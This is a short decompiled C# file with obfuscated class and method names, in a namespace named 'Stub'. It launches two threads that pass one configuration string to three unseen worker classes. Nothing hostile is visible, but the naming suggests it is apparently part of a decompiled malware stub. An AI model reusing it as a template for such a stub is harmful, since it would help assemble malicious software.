using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Stub
{
	// Token: 0x02000008 RID: 8
	public class Class12
	{
		// Token: 0x0600000C RID: 12 RVA: 0x00002914 File Offset: 0x00000B14
		public static void smethod_0()
		{
			string String_0 = Class30.String_3;
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread(delegate()
				{
					Class3.smethod_0(String_0);
					Class1.smethod_0(String_0);
				}));
				list.Add(new Thread(delegate()
				{
					Class0.smethod_0(String_0);
				}));
				foreach (Thread thread in list)
				{
					thread.Start();
				}
				foreach (Thread thread2 in list)
				{
					thread2.Join();
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x02000009 RID: 9
		[CompilerGenerated]
		private sealed class Class13
		{
			// Token: 0x0600000E RID: 14 RVA: 0x00002098 File Offset: 0x00000298
			public void method_0()
			{
				Class3.smethod_0(this.String_0);
				Class1.smethod_0(this.String_0);
			}

			// Token: 0x0600000F RID: 15 RVA: 0x000020B0 File Offset: 0x000002B0
			public void method_1()
			{
				Class0.smethod_0(this.String_0);
			}

			// Token: 0x04000003 RID: 3
			public string String_0;
		}
	}
}
